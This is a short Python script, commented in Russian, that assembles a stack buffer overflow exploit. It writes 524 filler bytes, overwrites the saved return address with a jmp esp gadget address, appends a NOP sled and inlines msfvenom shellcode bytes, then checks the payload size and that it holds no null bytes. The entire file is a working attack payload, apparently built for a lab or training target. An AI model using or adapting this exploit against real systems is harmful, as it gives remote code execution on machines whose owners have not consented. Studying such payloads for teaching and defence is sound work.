from struct import pack

# Смещение до saved EIP:
OFFSET_RET = 524

# Адрес gadget jmp esp (пример):
gadget_addr = 0x311712F3

# 1) «Заполнитель» до ret (можно любые байты, здесь 'A'):
junk = b"A" * OFFSET_RET

# 2) Перезапись return-address:
ret = pack("<I", gadget_addr)   # little-endian

# 3) NOP-sled:
nop_sled = b"\x90" * 50

# 4) Ваш shellcode из msfvenom:
buf =  b""
buf += b"\xda\xcf\xd9\x74\x24\xf4\xba\xc7\xbc\xcb\x2d\x5f"
buf += b"\x2b\xc9\xb1\x12\x31\x57\x17\x03\x57\x17\x83\x28"
buf += b"\x40\x29\xd8\x87\x62\x59\xc0\xb4\xd7\xf5\x6d\x38"
buf += b"\x51\x18\xc1\x5a\xac\x5b\xb1\xfb\x9e\x63\x7b\x7b"
buf += b"\x97\xe2\x7a\x13\xe8\xbd\x45\x89\x80\xbf\xb5\x5c"
buf += b"\x0d\x49\x54\xee\xcb\x19\xc6\x5d\xa7\x99\x61\x80"
buf += b"\x0a\x1d\x23\x2a\xfb\x31\xb7\xc2\x6b\x61\x18\x70"
buf += b"\x05\xf4\x85\x26\x86\x8f\xab\x76\x23\x5d\xab"

# 5) Конкатенируем всё:
payload = junk + ret + nop_sled + buf

# Проверки:
assert len(payload) <= 1000       # чтобы recv(...,1000) прочитал весь
assert b"\x00" not in payload     # ни одного нулевого байта

print(payload)
